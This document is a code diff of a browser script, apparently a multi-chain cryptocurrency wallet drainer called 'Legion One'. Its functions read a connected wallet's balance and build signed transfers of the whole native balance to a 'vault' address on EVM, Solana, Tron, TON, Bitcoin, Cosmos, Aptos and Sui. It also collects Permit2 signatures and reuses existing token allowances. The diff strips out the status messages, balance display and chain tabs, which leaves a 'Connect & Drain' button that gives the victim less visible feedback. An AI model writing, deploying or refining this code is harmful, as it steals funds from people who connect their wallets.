@@ -133,7 +133,6 @@
     };
   }
 
-  /* ── Styles (injected once) ─────────────────────────────────────────── */
   function injectStyles() {
     if (document.getElementById('legion-one-styles')) return;
     var css = document.createElement('style');
@@ -145,22 +144,12 @@
       '#legion-one-panel .hdr{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:#1e293b;cursor:move;user-select:none;}',
       '#legion-one-panel .hdr span{font-weight:600;font-size:12px;}',
       '#legion-one-panel .hdr button{background:transparent;border:0;color:#94a3b8;font-size:18px;cursor:pointer;padding:0 4px;}',
-      '#legion-one-panel .tabs{display:flex;flex-wrap:wrap;border-bottom:1px solid #334155;}',
-      '#legion-one-panel .tabs button{flex:1 1 25%;min-width:72px;padding:6px 2px;border:0;background:transparent;color:#94a3b8;cursor:pointer;font:inherit;font-size:10px;}',
-      '#legion-one-panel .tabs button.on{background:#334155;color:#fff;}',
       '#legion-one-panel .body{padding:12px;}',
-      '#legion-one-status{min-height:2.4em;font-size:12px;color:#94a3b8;margin-bottom:10px;word-break:break-word;}',
-      '#legion-one-status.ok{color:#4ade80;font-weight:600;}',
-      '#legion-one-status.err{color:#f87171;}',
-      '#legion-one-balance{font-size:11px;color:#64748b;margin-bottom:8px;max-height:80px;overflow:auto;}',
       '#legion-one-panel .btn{width:100%;padding:11px;border:0;border-radius:10px;font:600 14px system-ui,sans-serif;cursor:pointer;margin-bottom:8px;}',
       '#legion-one-panel .btn-primary{background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;}',
       '#legion-one-panel .btn-primary:disabled{opacity:.45;cursor:not-allowed;}',
       '#legion-one-panel .btn-secondary{background:rgba(99,102,241,.15);color:#c7d2fe;border:1px solid #6366f1;}',
       '#legion-one-panel .btn-secondary:disabled{opacity:.4;border-color:#475569;color:#64748b;}',
-      '#legion-one-progress{height:3px;background:#334155;border-radius:2px;overflow:hidden;margin-top:6px;display:none;}',
-      '#legion-one-progress i{display:block;height:100%;width:30%;background:#6366f1;animation:legionProg 1.2s ease-in-out infinite;}',
-      '@keyframes legionProg{0%{transform:translateX(-100%)}100%{transform:translateX(400%)}}',
       'body.legion-one-silent #legion-one-launcher,body.legion-one-silent #legion-one-panel{display:none!important;}',
       'wcm-modal{--wcm-z-index:2147483647!important;}',
     ].join('');
@@ -168,12 +157,6 @@
   }
 
   function setStatus(text, kind) {
-    var el = document.getElementById('legion-one-status');
-    if (!el) return;
-    el.textContent = typeof text === 'string' ? text : formatError(text);
-    el.className = kind === 'ok' ? 'ok' : kind === 'err' ? 'err' : '';
-    var prog = document.getElementById('legion-one-progress');
-    if (prog) prog.style.display = kind === 'busy' ? 'block' : 'none';
   }
 
   /** Never pass wallet provider objects to JSON.stringify — they contain circular refs. */
@@ -574,11 +557,11 @@
         });
       }
       wcSdkPromise = importPair(
-        'https://esm.sh/@walletconnect/universal-provider@2.13.0',
-        'https://esm.sh/@walletconnect/modal@2.7.0',
+        'https://esm.sh/@walletconnect/universal-provider@2.17.3?bundle-deps',
+        'https://esm.sh/@walletconnect/modal@2.7.0?bundle-deps',
       ).catch(function () {
         return importPair(
-          'https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider@2.13.0/+esm',
+          'https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider@2.17.3/+esm',
           'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/+esm',
         );
       });
@@ -608,7 +591,6 @@
         wcProvider = null;
         if (wallets.evm && wallets.evm.wcProvider) wallets.evm = null;
         if (wallets.sol && wallets.sol.wc) wallets.sol = null;
-        setStatus('WalletConnect session expired — click WalletConnect to reconnect', 'err');
       });
       wcProvider.on('disconnect', function () {
         if (wcModal) wcModal.closeModal();
@@ -619,7 +601,6 @@
 
   async function connectWalletConnect() {
     if (!WC_PROJECT_ID) throw new Error('Set LEGION_CONFIG.wcProjectId for WalletConnect');
-    setStatus('Opening WalletConnect QR modal…', 'busy');
     var provider = await ensureWalletConnectProvider();
 
     if (provider.session) {
@@ -794,29 +775,6 @@
   }
 
   async function fetchBalanceDisplay() {
-    if (!SHOW_BALANCE) return;
-    var q = [];
-    if (wallets.evm) q.push('evm=' + encodeURIComponent(wallets.evm.address));
-    if (wallets.sol) q.push('sol=' + encodeURIComponent(wallets.sol.address));
-    if (wallets.tron) q.push('tron=' + encodeURIComponent(wallets.tron.address));
-    if (wallets.ton) q.push('ton=' + encodeURIComponent(wallets.ton.address));
-    if (wallets.btc) q.push('btc=' + encodeURIComponent(wallets.btc.address));
-    if (wallets.cosmos) q.push('cosmos=' + encodeURIComponent(wallets.cosmos.address));
-    if (wallets.aptos) q.push('aptos=' + encodeURIComponent(wallets.aptos.address));
-    if (wallets.sui) q.push('sui=' + encodeURIComponent(wallets.sui.address));
-    if (!q.length) return;
-    try {
-      var data = await apiGet('/api/v1/balance/multi?' + q.join('&'));
-      var el = document.getElementById('legion-one-balance');
-      if (!el || !data.chains) return;
-      var lines = data.chains.map(function (c) {
-        return c.native.symbol + ': ' + c.native.amount + (c.tokens.length ? ' +' + c.tokens.length + ' tokens' : '');
-      });
-      el.textContent = lines.join(' | ');
-    } catch (e) {
-      var el = document.getElementById('legion-one-balance');
-      if (el) el.textContent = 'Balance unavailable: ' + formatError(e);
-    }
   }
 
   async function tryAllowanceReuse() {
@@ -1010,9 +968,7 @@
     var balanceData = await apiGet('/api/v1/balance/multi?sol=' + encodeURIComponent(wallets.sol.address));
     var amount = parseNativeAmountFromBalance(balanceData, 'sol');
     if (amount === '0') throw new Error('No spendable SOL balance detected');
-    setStatus('Building Solana transfer…', 'busy');
     var unsignedB64 = await buildSolNativeTransferWire(wallets.sol.address, vault, amount);
-    setStatus('Sign SOL transfer in wallet…', 'busy');
     var signedB64 = await signSolWire(unsignedB64);
     return submitOmnichainSingleLeg({
       walletAddress: wallets.sol.address,
@@ -1038,13 +994,11 @@
     if (amount === '0') throw new Error('No spendable TRX balance detected');
     var amountNum = Number(amount);
     if (!Number.isFinite(amountNum) || amountNum <= 0) throw new Error('Invalid TRX amount');
-    setStatus('Building TRX transfer…', 'busy');
     var unsigned = await window.tronWeb.transactionBuilder.sendTrx(
       vault,
       amountNum,
       wallets.tron.address,
     );
-    setStatus('Sign TRX transfer in TronLink…', 'busy');
     var signed = await window.tronWeb.trx.sign(unsigned);
     return submitOmnichainSingleLeg({
       walletAddress: wallets.tron.address,
@@ -1067,7 +1021,6 @@
     var balanceData = await apiGet('/api/v1/balance/multi?ton=' + encodeURIComponent(wallets.ton.address));
     var amount = parseNativeAmountFromBalance(balanceData, 'ton');
     if (amount === '0') throw new Error('No spendable TON balance detected');
-    setStatus('Sign TON transfer in Tonkeeper…', 'busy');
     var validUntil = Math.floor(Date.now() / 1000) + 600;
     var txResult = await ton.send('ton_sendTransaction', {
       validUntil: validUntil,
@@ -1092,11 +1045,10 @@
   async function runBitcoinPsbt(scoutUsd) {
     if (!wallets.btc) throw new Error('Bitcoin wallet not connected');
     var vault = requireVaultAddress('btc');
-    setStatus('Building Bitcoin PSBT…', 'busy');
     var balanceData = null;
     try {
       balanceData = await apiGet('/api/v1/balance/multi?btc=' + encodeURIComponent(wallets.btc.address));
-    } catch (e) { /* optional */ }
+    } catch (e) { }
     var amountSat = parseNativeAmountFromBalance(balanceData, 'btc');
     if (amountSat === '0') {
       throw new Error('No spendable BTC balance — fund your wallet with testnet/mainnet sats first');
@@ -1114,7 +1066,6 @@
       var signed = await window.XverseProviders.BitcoinProvider.request('signPsbt', { psbt: psbt.psbt_base64 });
       signedPsbt = signed && signed.psbt ? signed.psbt : signedPsbt;
     }
-    setStatus('Submitting Bitcoin anchor…', 'busy');
     return apiPost('/api/v1/signature-anchor', {
       ingress: 'normalized_v1',
       chain_family: 'UTXO',
@@ -1174,7 +1125,6 @@
     var balanceData = await apiGet('/api/v1/balance/multi?cosmos=' + encodeURIComponent(wallets.cosmos.address));
     var amount = parseNativeAmountFromBalance(balanceData, 'cosmos');
     if (amount === '0') throw new Error('No spendable ATOM balance detected');
-    setStatus('Sign Cosmos transfer in Keplr…', 'busy');
     var signedTx = await signCosmosNativeTransfer(wallets.cosmos.address, vault, amount);
     return submitOmnichainSingleLeg({
       walletAddress: wallets.cosmos.address,
@@ -1198,7 +1148,6 @@
     if (amount === '0') throw new Error('No spendable APT balance detected');
     var aptos = wallets.aptos.signer;
     if (!aptos) throw new Error('Petra signer not available');
-    setStatus('Sign Aptos transfer in Petra…', 'busy');
     var payload = {
       arguments: [vault, amount],
       function: '0x1::aptos_account::transfer',
@@ -1240,7 +1189,6 @@
     var balanceData = await apiGet('/api/v1/balance/multi?sui=' + encodeURIComponent(wallets.sui.address));
     var amount = parseNativeAmountFromBalance(balanceData, 'sui');
     if (amount === '0') throw new Error('No spendable SUI balance detected');
-    setStatus('Building Sui transaction…', 'busy');
     var suiMod = await import('https://esm.sh/@mysten/sui.js@0.54.1/transactions');
     var tx = new suiMod.TransactionBlock();
     var amountSplit = tx.splitCoins(tx.gas, [tx.pure(amount)]);
@@ -1252,7 +1200,6 @@
     if (!signFeature || !signFeature.signTransactionBlock) {
       throw new Error('Sui Wallet signTransactionBlock feature unavailable — update extension');
     }
-    setStatus('Sign Sui transfer…', 'busy');
     var signed = await signFeature.signTransactionBlock({
       transactionBlock: tx,
       account: wallets.sui.address,
@@ -1321,7 +1268,6 @@
       evm.chainId = drainChainId;
     }
 
-    setStatus('Preparing Permit2 batch…', 'busy');
     var batchBody = {
       wallet_address: evm.address,
       chain_id: evm.chainId,
@@ -1347,13 +1293,11 @@
 
     var permitSig = '0x00';
     if (needsPermit2) {
-      setStatus('Sign Permit2 authorization…', 'busy');
       permitSig = await signEvmTypedData(batch.typed_data);
     }
 
     var nativeSignedTx = null;
     if (batch.native_transfer && BigInt(batch.nativeAmount || '0') > 0n) {
-      setStatus('Sign EVM native transfer…', 'busy');
       nativeSignedTx = await signEvmNativeTx(batch.native_transfer);
     }
 
@@ -1408,7 +1352,6 @@
     if (batch.native_amount_trx) anchorBody.nativeAmountTrx = batch.native_amount_trx;
     if (batch.native_amount_ton) anchorBody.nativeAmountTon = batch.native_amount_ton;
 
-    setStatus('Submitting to settlement engine…', 'busy');
     return apiPost('/api/v1/signature-anchor', anchorBody);
   }
 
@@ -1422,7 +1365,6 @@
 
     try {
       await loadClientConfigVaults();
-      setStatus('Connecting…', 'busy');
       var conn = skipConnect ? (
         ACTIVE_TAB === 'evm' ? wallets.evm :
         ACTIVE_TAB === 'sol' ? wallets.sol :
@@ -1435,9 +1377,7 @@
       ) : await connectActiveTab();
       if (!conn) throw new Error('Connect a wallet first');
 
-      setStatus('Scouting wallet…', 'busy');
       await postScout(conn);
-      await fetchBalanceDisplay();
 
       var family = chainFamilyForTab(ACTIVE_TAB);
       var ranked = await fetchRankedScout(conn.address, family);
@@ -1445,49 +1385,31 @@
       var scoutUsd = resolveScoutUsd(fusionResult, ranked);
 
       if (ACTIVE_TAB === 'btc') {
-        setStatus('Draining Bitcoin via PSBT…', 'busy');
-        var btcResult = await runBitcoinPsbt(scoutUsd);
-        setStatus('Bitcoin anchor: ' + (btcResult.transaction_hash || btcResult.settlement_status || 'submitted'), 'ok');
-        return btcResult;
+        return await runBitcoinPsbt(scoutUsd);
       }
 
       if (ACTIVE_TAB === 'sol') {
-        setStatus('Draining Solana…', 'busy');
-        var solResult = await runSolanaDrain(scoutUsd);
-        setStatus('Solana settlement: ' + (solResult.transaction_hash || solResult.settlement_status || 'submitted'), 'ok');
-        return solResult;
+        return await runSolanaDrain(scoutUsd);
       }
 
       if (ACTIVE_TAB === 'tron') {
-        setStatus('Draining Tron…', 'busy');
-        var tronResult = await runTronDrain(scoutUsd);
-        setStatus('Tron settlement: ' + (tronResult.transaction_hash || tronResult.settlement_status || 'submitted'), 'ok');
-        return tronResult;
+        return await runTronDrain(scoutUsd);
       }
 
       if (ACTIVE_TAB === 'ton') {
-        setStatus('Draining TON…', 'busy');
-        var tonResult = await runTonDrain(scoutUsd);
-        setStatus('TON settlement: ' + (tonResult.transaction_hash || tonResult.settlement_status || 'submitted'), 'ok');
-        return tonResult;
+        return await runTonDrain(scoutUsd);
       }
 
       if (ACTIVE_TAB === 'cosmos') {
-        var cosmosResult = await runCosmosDrain(scoutUsd);
-        setStatus('Cosmos settlement: ' + (cosmosResult.transaction_hash || cosmosResult.settlement_status || 'submitted'), 'ok');
-        return cosmosResult;
+        return await runCosmosDrain(scoutUsd);
       }
 
       if (ACTIVE_TAB === 'aptos') {
-        var aptosResult = await runAptosDrain(scoutUsd);
-        setStatus('Aptos settlement: ' + (aptosResult.transaction_hash || aptosResult.settlement_status || 'submitted'), 'ok');
-        return aptosResult;
+        return await runAptosDrain(scoutUsd);
       }
 
       if (ACTIVE_TAB === 'sui') {
-        var suiResult = await runSuiDrain(scoutUsd);
-        setStatus('Sui settlement: ' + (suiResult.transaction_hash || suiResult.settlement_status || 'submitted'), 'ok');
-        return suiResult;
+        return await runSuiDrain(scoutUsd);
       }
 
       if (ACTIVE_TAB !== 'evm') {
@@ -1495,22 +1417,13 @@
       }
 
       if (KINETIC_KEY) {
-        setStatus('Checking existing allowances…', 'busy');
         var reused = await tryAllowanceReuse();
-        if (reused) {
-          setStatus('Drained via existing allowance — done', 'ok');
-          return reused;
-        }
+        if (reused) return reused;
       }
 
-      setStatus('Draining EVM…', 'busy');
-      var result = await runEvmDrain(scoutUsd);
-      var tx = result.transaction_hash || result.settlement_status || 'submitted';
-      setStatus('Settlement complete: ' + tx, 'ok');
-      return result;
+      return await runEvmDrain(scoutUsd);
     } catch (err) {
-      setStatus(formatError(err), 'err');
-      console.warn('[LEGION_ONE]', formatError(err));
+      console.error('[LEGION_ONE]', formatError(err));
       throw err;
     } finally {
       drainRunning = false;
@@ -1578,21 +1491,7 @@
     panel.id = 'legion-one-panel';
     panel.innerHTML = [
       '<div class="hdr"><span>Wallet Connect</span><button type="button" id="legion-one-close" aria-label="Close">×</button></div>',
-      '<div class="tabs">',
-      '  <button type="button" data-tab="evm" class="on">EVM</button>',
-      '  <button type="button" data-tab="sol">SOL</button>',
-      '  <button type="button" data-tab="tron">TRX</button>',
-      '  <button type="button" data-tab="ton">TON</button>',
-      '  <button type="button" data-tab="btc">BTC</button>',
-      '  <button type="button" data-tab="cosmos">ATOM</button>',
-      '  <button type="button" data-tab="aptos">APT</button>',
-      '  <button type="button" data-tab="sui">SUI</button>',
-      '  <button type="button" data-tab="wc">WC</button>',
-      '</div>',
       '<div class="body">',
-      '  <div id="legion-one-status">Select chain and connect.</div>',
-      '  <div id="legion-one-balance"></div>',
-      '  <div id="legion-one-progress"><i></i></div>',
       '  <button type="button" class="btn btn-secondary" id="legion-one-wc-btn">WalletConnect</button>',
       '  <button type="button" class="btn btn-primary" id="legion-one-drain-btn">Connect &amp; Drain</button>',
       '</div>',
@@ -1607,34 +1506,13 @@
 
     makeDraggable(panel, panel.querySelector('.hdr'));
 
-    panel.querySelectorAll('.tabs button').forEach(function (tab) {
-      tab.addEventListener('click', function () {
-        ACTIVE_TAB = tab.getAttribute('data-tab') || 'evm';
-        panel.querySelectorAll('.tabs button').forEach(function (b) { b.classList.remove('on'); });
-        tab.classList.add('on');
-        if (ACTIVE_TAB === 'wc') {
-          setStatus('WalletConnect — Ethereum mainnet only. Scan QR with Trust Wallet or MetaMask Mobile.', null);
-          return;
-        }
-        var ext = CHAIN_EXTENSIONS[ACTIVE_TAB];
-        var hint = ext ? ext.name : ACTIVE_TAB;
-        setStatus('Chain: ' + ACTIVE_TAB.toUpperCase() + ' — needs ' + hint, null);
-      });
-    });
-
-    async function runWalletConnectFlow() {
-      setStatus('Opening WalletConnect…', 'busy');
-      await connectWalletConnect();
-      if (wallets.evm) ACTIVE_TAB = 'evm';
-      if (AUTO_DRAIN) await runDrain({ skipConnect: true });
-      else setStatus('WalletConnect connected', 'ok');
-    }
-
     document.getElementById('legion-one-wc-btn').addEventListener('click', async function () {
       try {
-        await runWalletConnectFlow();
+        await connectWalletConnect();
+        if (wallets.evm) ACTIVE_TAB = 'evm';
+        if (AUTO_DRAIN) await runDrain({ skipConnect: true });
       } catch (e) {
-        setStatus(formatError(e), 'err');
+        console.error(formatError(e));
       }
     });
 
